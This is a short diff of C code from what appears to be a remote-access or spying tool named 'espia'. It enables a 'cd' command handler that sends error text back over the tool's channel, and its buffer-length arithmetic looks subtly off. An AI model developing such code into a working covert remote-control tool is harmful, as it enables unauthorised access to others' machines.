@@ -66,7 +66,10 @@ int main() {
             ls(espia_send);
         } else if (strcmp(cmd_buff, "cd") == 0) {
             WCHAR err_buff[50];
-            //cd(cmd_arg, err_buff);
+            if (cd(cmd_arg, err_buff) != ESPIA_OK) {
+                printf("%S %d\n", err_buff, sizeof(err_buff));
+                espia_send(err_buff, wcslen(err_buff)*4);
+            }
         }
     }
     /* ---------------------------------------------------- */
